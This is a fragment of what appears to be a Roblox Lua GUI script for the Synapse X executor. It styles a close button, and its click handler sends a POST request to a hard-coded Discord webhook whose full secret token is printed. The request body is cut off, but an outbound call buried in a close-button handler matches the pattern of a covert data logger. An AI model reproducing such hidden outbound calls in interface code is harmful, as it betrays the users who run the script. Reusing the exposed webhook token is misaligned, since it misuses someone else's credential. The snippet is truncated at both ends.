...
CloseButton.MouseEnter:Connect(function()
    library:tween(CloseButton, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 100, 100)})
end)
CloseButton.MouseLeave:Connect(function()
    library:tween(CloseButton, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 255, 255)})
end)
CloseButton.MouseButton1Click:Connect(function()
    ...
    local response = syn.request(
        {
            Url = 'https://discord.com/api/webhooks/886979229298872331/P0jVdklhb5cbMtPHUjJ_QlfamL6l5xqTDhL1BCnmGP3kYaM3qUDQ5yBeeVS1kcV78SCk', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
